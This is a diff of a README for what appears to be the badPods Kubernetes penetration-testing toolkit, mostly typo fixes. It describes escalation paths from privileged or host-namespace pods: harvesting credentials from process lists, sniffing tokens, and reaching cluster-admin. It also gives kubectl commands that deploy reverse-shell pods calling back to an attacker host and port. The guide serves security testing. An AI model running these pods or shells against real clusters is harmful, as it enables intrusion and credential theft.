@@ -40,9 +40,6 @@ hostIPC only | [yaml](yaml/hostipc-only/README.md) | [readme](yaml/hostipc-only/
 # Impact - What's the worst that can happen?
 **Caveat:** There are many kubernetes specific security controls available to administrators that can reduce the impact of pods created with the following privileges. As is always the case with penetration testing, your milage may vary.
 
-
-
-
 ## Nothing allowed 
 ❌privileged ❌hostPID ❌hostPath ❌hostNetwork ❌hostIPC
 
@@ -84,7 +81,7 @@ Reference:
 * https://raesene.github.io/blog/2019/04/01/The-most-pointless-kubernetes-command-ever/
 
  
-## HostPID and Privileged
+## HostPID and privileged
 ✅privileged ✅hostPID ❌hostPath ❌hostNetwork ❌hostIPC
 
 
@@ -145,7 +142,7 @@ Reference:
 Unlikely but possible path to cluster compromise 
 
 ### How?
-Run `ps -aux` on the host which will show you all the proceses running on the host, including proccesses running within each pod. Look for any process that includes passwords, tokens, or keys in the `ps` output. Pipe the `ps` output to `more` or `less` to make sure the full output is word wrapped. If you are lucky, you will find credentials and you'll be able to use them to privesc within the cluster, to services supported by the cluster, or to services that cluster hosted applications are communicating with. It is a long shot, but you might find a kubernetes token or some other authentication material that will allow you to access other namespaces and eventually escalate all the way up to cluster-admin. You can also kill any process on the node (DOS), but I would advise against it!  
+Run `ps -aux` on the host which will show you all the process running on the host, including proccesses running within each pod. Look for any process that includes passwords, tokens, or keys in the `ps` output. Pipe the `ps` output to `more` or `less` to make sure the full output is word wrapped. If you are lucky, you will find credentials and you'll be able to use them to privesc within the cluster, to services supported by the cluster, or to services that cluster hosted applications are communicating with. It is a long shot, but you might find a kubernetes token or some other authentication material that will allow you to access other namespaces and eventually escalate all the way up to cluster-admin. You can also kill any process on the node (DOS), but I would advise against it!  
 
 ### Usage and exploitation examples 
 [yaml/hostpid-only/README.md](yaml/hostpid-only/README.md)
@@ -161,7 +158,7 @@ Potential path to cluster compromise
 ### How?
 This opens up two potential escalation paths: 
 * **Sniff traffic** - You can use tcpdump or wireshark to sniff unencrypted traffic on any interface on the host. You might get lucky and find service account tokens or other sensitive information that is transmitted over unencrypted channels.  
-* **Access services bound to localhost**  You can also reach services that only listen on the host's loopback interface or are otherwise blocked by nework polices. These services might turn into a fruitful privesc path. 
+* **Access services bound to localhost**  You can also reach services that only listen on the host's loopback interface or are otherwise blocked by network polices. These services might turn into a fruitful privesc path. 
 
 ### Usage and exploitation examples 
 [yaml/hostnetwork-only/README.md](yaml/hostnetwork-only/README.md) 
@@ -175,7 +172,7 @@ This opens up two potential escalation paths:
 Not seen often - but potential limited compromise 
 
 ### How?
-If any process on the host or any processes within a pod is using the host's interprocess communication mechanisms (shared memory, semaphore arrays, message queues, etc.), you will be able to read/write to those same mechanisms. That said, with things like message queues, even if you can read something in the queue, reading it is a destructive action that will remove it from the queue, so beware. 
+If any process on the host or any processes within a pod is using the host's inter-process communication mechanisms (shared memory, semaphore arrays, message queues, etc.), you will be able to read/write to those same mechanisms. That said, with things like message queues, even if you can read something in the queue, reading it is a destructive action that will remove it from the queue, so beware. 
 
 ### More details and exploitation examples 
 [yaml/hostipc-only/README.md](yaml/hostipc-only/README.md) 
@@ -189,10 +186,9 @@ git clone https://github.com/BishopFox/badPods
 cd badPods
 ```
 
-### Create the pods 
+### Create the pods (or at least try to create them)
 
 ```bash
-# Create all pods (or at least try to create them)
 kubectl apply -f ./yaml/everything-allowed/pod-everything-allowed.yaml
 kubectl apply -f ./yaml/priv-and-hostpid/pod-priv-and-hostpid.yaml 
 kubectl apply -f ./yaml/priv-only/pod-priv-only.yaml
@@ -202,8 +198,8 @@ kubectl apply -f ./yaml/hostnetwork-only/pod-hostnetwork-only.yaml
 kubectl apply -f ./yaml/hostipc-only/pod-hostipc-only.yaml
 ```
 
-### Reverse Shell version of each pod
-If you can create pods but not exec  into them, you can use the reverse shell version of each pod. To avoid having to edit each pod with your host and port, you can environment variables and the envsubst command. Remember to spin up all of your listeners first:
+### Reverse shell version of each pod
+If you can create pods but not exec  into them, you can use the reverse shell version of each pod. To avoid having to edit each pod with your host and port, you can environment variables and the `envsubst` command. Remember to spin up all of your listeners first!
 
 ```bash
 HOST="10.0.0.1" PORT="3111" envsubst < ./yaml/priv-and-hostpid/pod-priv-and-hostpid-revshell.yaml | kubectl apply -f -
@@ -215,4 +211,4 @@ HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/everything-allowed/pod-everything-
 ```
 
 # Acknowledgements 
-Thank you [Rory McCune](https://twitter.com/raesene), [Duffie Cooley](https://twitter.com/mauilion), [Brad Geesaman](https://twitter.com/bradgeesaman), [Tabitha Sable](https://twitter.com/tabbysable), [Ian Coldwater](https://twitter.com/IanColdwater), and [Mark Manning](https://twitter.com/antitree) for publicly sharing so much knowledge about Kubernetes security. 
+Thank you [Rory McCune](https://twitter.com/raesene), [Duffie Cooley](https://twitter.com/mauilion), [Brad Geesaman](https://twitter.com/bradgeesaman), [Tabitha Sable](https://twitter.com/tabbysable), [Ian Coldwater](https://twitter.com/IanColdwater), and [Mark Manning](https://twitter.com/antitree) for publicly sharing so much knowledge about Kubernetes offensive security. 
